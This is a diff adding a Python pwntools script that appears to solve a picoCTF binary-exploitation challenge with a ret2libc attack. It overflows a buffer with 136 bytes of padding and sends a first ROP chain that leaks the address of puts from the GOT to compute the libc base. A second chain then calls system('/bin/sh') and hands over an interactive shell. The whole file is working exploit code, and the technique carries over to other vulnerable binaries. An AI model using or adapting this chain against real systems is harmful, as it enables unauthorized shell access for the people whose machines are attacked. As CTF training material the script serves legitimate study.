@@ -1,0 +1,69 @@
+import sys
+
+from pwn import *
+
+libcelf = {
+  "local": "/lib/x86_64-linux-gnu/libc.so.6",
+  "remote": "./libc.so.6"
+}
+
+mode = sys.argv[1]
+print(f"mode: {mode}")
+if mode != "local" and mode != "remote": print("exitting.."); sys.exit()
+
+vuln_elf = ELF("./vuln")
+r = vuln_elf.process() if mode == "local" else remote("mercury.picoctf.net", sys.argv[2])
+
+libc = ELF(libcelf[mode])
+
+pop_rdi = 0x0000000000400913
+ret = 0x000000000040052e
+
+puts_plt = vuln_elf.plt['puts'] #grab plt address of puts function
+main_plt = vuln_elf.symbols['main'] #grab address of main
+puts_got = vuln_elf.got['puts']
+
+junk = b"A" * 136
+
+log.info(f"main starts @ {hex(main_plt)}")
+log.info(f"puts plt @ {hex(puts_plt)}")
+log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
+log.info(f"puts got @ {hex(puts_got)}")
+
+rop1 = b""
+rop1 += junk
+rop1 += p64(pop_rdi) #fill rip with pop rdi; ret address
+rop1 += p64(puts_got) #put address of puts global offset table in the rdi register
+rop1 += p64(puts_plt) #call to puts in the procedural link table, looks to rdi for argument (puts_got)
+rop1 += p64(main_plt) #return to main of program after tricking it into leaking puts address
+
+print(r.clean()) #clean buffer and print all received bytes
+r.sendline(rop1)
+
+print(r.recvline())
+
+received_line = r.recvline().strip()
+leak = u64(received_line.ljust(8, b"\x00"))
+log.info(f"leaked puts address @ {hex(leak)}")
+
+libc.address = leak - libc.symbols['puts']
+log.info(f"libc base @ {hex(libc.address)}")
+log.info("now we have libc base, we can find system and pwn that sh*t")
+
+bin_sh = next(libc.search(b"/bin/sh"))
+system = libc.symbols['system']
+
+log.info(f"/bin/sh located @ {hex(bin_sh)}")
+log.info(f"system function located @ {hex(system)}")
+
+rop2 = b""
+rop2 += junk
+rop2 += p64(ret)
+rop2 += p64(pop_rdi) #Once again, pop rdi to place argument in
+rop2 += p64(bin_sh) #put /bin/sh into rdi to be passed to system
+rop2 += p64(system) #call system with /bin/sh argument from rdi
+
+r.clean()
+r.sendline(rop2)
+r.interactive()
+
